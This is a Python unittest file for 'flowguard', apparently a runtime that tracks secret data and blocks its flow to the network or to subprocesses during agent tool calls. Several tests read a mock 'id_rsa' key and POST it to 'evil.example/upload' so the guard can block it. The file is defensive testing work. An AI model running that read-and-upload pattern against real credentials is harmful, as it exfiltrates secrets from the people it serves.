from __future__ import annotations

import builtins
import subprocess
import sys
import tempfile
import types
import unittest
from pathlib import Path
from typing import Any
from urllib import request

from flowguard import FlowguardBlocked, FlowguardRuntime, TrackedStr


class TransparentProtectionTests(unittest.TestCase):
    def test_protect_patches_builtin_open_and_restores_it(self) -> None:
        original_open = builtins.open

        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])

            with runtime.protect():
                with open(secret_path) as handle:
                    secret = handle.read()

            self.assertIsInstance(secret, TrackedStr)
            self.assertIs(builtins.open, original_open)

    def test_protect_blocks_urllib_secret_payload_before_urlopen(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])

            with runtime.protect():
                with open(secret_path) as handle:
                    secret = handle.read()
                req = request.Request(
                    "https://evil.example/upload",
                    data=secret.encode("utf-8"),
                    method="POST",
                )

                with self.assertRaises(FlowguardBlocked) as blocked:
                    request.urlopen(req)

            self.assertEqual(blocked.exception.policy, "SecretToNetwork")

    def test_nested_protect_does_not_double_patch_urlopen(self) -> None:
        calls: list[dict[str, Any]] = []
        original_urlopen = request.urlopen

        def fake_urlopen(req: Any, data: Any = None, *args: Any, **kwargs: Any) -> bytes:
            calls.append({"req": req, "data": data, "args": args, "kwargs": kwargs})
            return b"ok"

        request.urlopen = fake_urlopen
        try:
            runtime = FlowguardRuntime()
            with runtime.protect():
                with runtime.protect():
                    req = request.Request(
                        "https://telemetry.example/event",
                        data=b"ok",
                        method="POST",
                    )
                    request.urlopen(req)

            allowed_events = [
                event
                for event in runtime.emitter.events
                if event["type"] == "http_send_allowed"
            ]

            self.assertEqual(len(calls), 1)
            self.assertEqual(len(allowed_events), 1)
        finally:
            request.urlopen = original_urlopen

    def test_protect_blocks_loaded_requests_module_before_post(self) -> None:
        calls: list[dict[str, Any]] = []
        fake_requests = types.ModuleType("requests")

        def post(url: str, *, data: Any = None, **kwargs: Any) -> bytes:
            calls.append({"url": url, "data": data, "kwargs": kwargs})
            return b"ok"

        fake_requests.post = post
        old_requests = sys.modules.get("requests")
        sys.modules["requests"] = fake_requests

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                secret_path = Path(tmpdir) / "id_rsa"
                secret_path.write_text("PRIVATE KEY", encoding="utf-8")
                runtime = FlowguardRuntime(secret_paths=[secret_path])

                with runtime.protect():
                    with open(secret_path) as handle:
                        secret = handle.read()
                    with self.assertRaises(FlowguardBlocked):
                        fake_requests.post("https://evil.example/upload", data=secret)

                self.assertEqual(calls, [])
        finally:
            if old_requests is None:
                sys.modules.pop("requests", None)
            else:
                sys.modules["requests"] = old_requests

    def test_tool_calls_run_inside_protection_context(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])

            @runtime.tool
            def read_with_builtin_open(path: str) -> str:
                with open(path) as handle:
                    return handle.read()

            secret = read_with_builtin_open(str(secret_path))

            self.assertIsInstance(secret, TrackedStr)
            self.assertIn(
                "protect_start",
                [event["type"] for event in runtime.emitter.events],
            )

    def test_subprocess_is_blocked_inside_protection_context(self) -> None:
        runtime = FlowguardRuntime()

        with runtime.protect():
            with self.assertRaises(FlowguardBlocked) as blocked:
                subprocess.run(["echo", "hello"], check=False)

        self.assertEqual(blocked.exception.policy, "UnbrokeredSubprocess")


if __name__ == "__main__":
    unittest.main()
